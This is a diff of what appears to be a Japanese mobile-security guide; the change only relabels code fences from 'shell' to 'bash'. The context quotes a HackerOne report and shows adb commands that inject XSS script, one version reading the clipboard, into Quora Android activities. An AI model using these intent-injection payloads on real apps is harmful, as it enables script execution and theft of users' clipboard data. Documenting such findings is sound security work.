@@ -144,7 +144,7 @@ Sergey Bobrov はこれを以下の [HackerOne report](https://hackerone.com/rep
 
 - ADB
 
-  ```shell
+  ```bash
   $ adb shell
   $ am start -n com.quora.android/com.quora.android.ActionBarContentActivity \
   -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
@@ -152,7 +152,7 @@ Sergey Bobrov はこれを以下の [HackerOne report](https://hackerone.com/rep
 
 - Clipboard Data
 
-  ```shell
+  ```bash
   $ am start -n com.quora.android/com.quora.android.ModalContentActivity  \
   -e url 'http://test/test' -e html \
   '<script>alert(QuoraAndroid.getClipboardData());</script>'
